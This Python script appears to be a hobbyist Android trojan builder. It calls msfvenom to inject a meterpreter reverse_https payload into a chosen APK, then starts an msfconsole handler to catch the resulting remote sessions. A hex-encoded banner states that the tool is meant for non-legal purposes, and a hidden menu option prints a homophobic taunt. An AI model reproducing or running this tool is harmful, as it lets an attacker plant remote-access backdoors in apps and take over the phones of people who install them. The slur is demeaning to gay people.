import os
import readline
from rich import print
    

banner = """[red]
██╗  ██╗ █████╗ ███╗   ███╗███████╗██████╗  ██████╗ ███████╗
██║ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝ ██╔════╝
█████╔╝ ███████║██╔████╔██║█████╗  ██████╔╝██║  ███╗█████╗  
██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║   ██║██╔══╝  
██║  ██╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║╚██████╔╝███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝[/red]
61 20 74 6F 6F 6C 20 6D 61 64 65 20 62 79 20 6D 
65 20 74 6F 20 74 75 72 6E 20 69 6E 6A 65 63 74 
20 6F 72 20 6D 65 72 67 65 20 6D 61 6C 69 63 69 
6F 75 73 20 61 70 6B 73 20 69 6E 74 6F 20 61 20 
6E 6F 72 6D 61 6C 20 61 70 6B 20 66 6F 72 20 6E 
6F 6E 20 6C 65 67 61 6C 20 70 75 72 70 6F 73 65 
73 20 0A 49 27 6D 20 6E 6F 74 20 67 61 79 61 20
"""
menu_1 = """    
1. inject a metasploit framework payload into an apk with a metasploit session
2. number 1 but witout a session
3. just session
-3923232134234234. secret
4. merge to apks into one (Not implemented yet)
5. exit
"""


class apkmerger:
    def __init__(self , apk1, apk2):
        pass
    def copy(self):
        pass
    def decompile(self):
        pass
    def scan(self):
        pass
    def merge(self):
        pass
    def recompile(self):
        pass
    def export(self):
        pass



def yesorno():
    while True:
        user_input = input("(y/n) : ")
        user_input = user_input.lower()
        if user_input == "y" or user_input == "yes":
            return True
        elif user_input == "n" or user_input == "no":
            return False
        else:
            print("Invalid input, please enter 'y' or 'n'.")


def hinput(value_arry):#:)
    result = {}
    running = True
    while running:
        # takeing input
        for item in value_arry:
            result[str(item)] = input(f"set {str(item)} to : ")
        # checking if input is correct
        for item in value_arry:
            print(f"{item} is set to {result[str(item)]}")
        print("[yellow]* are you sure[/yellow]")
        user_conf = yesorno()
        if user_conf:
            running = False
        else:
            print("[red]Please re-enter the values.[/red]")
    return result


def main():
    print(banner)
    running = True
    while running:
        print(menu_1)
        choice = input("Enter your choice (default is 1 ): ")
        if choice == "1" or choice == "":
            print("Injecting a metasploit framework payload into an apk with a metasploit session")
            # Implement the logic for this option
            options = ["ip addr" , "port" , "apk" , "output name"]
            user_input = hinput(options)
            command = f"msfvenom -x {user_input['apk']} -p android/meterpreter/reverse_https -a dalvik --platform android lhost={user_input['ip addr']} lport={user_input['port']} -o {user_input['output name']}.apk"
            print(f"[green]Running command: {command}[/green]")
            os.system(command)
            # now starting the msfconsole
            print("[yellow]Starting msfconsole...?[/yellow]")

            os.system(f"msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_https; set LHOST {user_input['ip addr']}; set LPORT {user_input['port']}; exploit'")

        elif choice == "2":
            print("Injecting a metasploit framework payload into an apk without a session")
            # Implement the logic for this option
        elif choice == "3":
            print("Just session")
            # Implement the logic for this option
        elif choice == "-3923232134234234":
            print("Secret option selected")
            print("[red]You ARE GAY[/red]")
            # Implement the secret logic here
        elif choice == "4":
            print("Merging two apks into one (Not implemented yet)")
            # Implement the logic for merging apks
        elif choice == "5":
            print("Exiting...")
            running = False
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    main()